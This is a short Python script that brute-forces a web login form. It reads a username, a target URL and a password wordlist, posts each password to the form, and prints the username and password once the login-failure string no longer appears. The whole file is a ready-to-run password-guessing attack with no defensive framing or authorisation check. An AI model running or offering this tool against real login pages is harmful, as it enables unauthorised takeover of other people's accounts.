
import requests
from termcolor import colored

url = input('Enter Page URL:')
username = input('Enter Username for the account to Bruteforce:')
password_File = input('Enter Password file to use:')
login_Failed_String = input('Enter String that occurs when login fails')


def cracking(username,url):
	for password in passwords:
		password = password.strip()
		print(colored(('Trying: ' + password), 'red'))
		data = {'username':username,'password':password,'Login':'submit'}
		response = requests.post(url, data=data)
		if login_Failed_String in response.content.decode():
			pass
		else:
			print(colored((' Found Username: ==> ' + username), 'green'))
			print(colored((' Found Password: ==> ' + password), 'green'))
			exit()




with open(password_File, 'r') as passwords:
	cracking(username, url)

print('Password not in List!!')

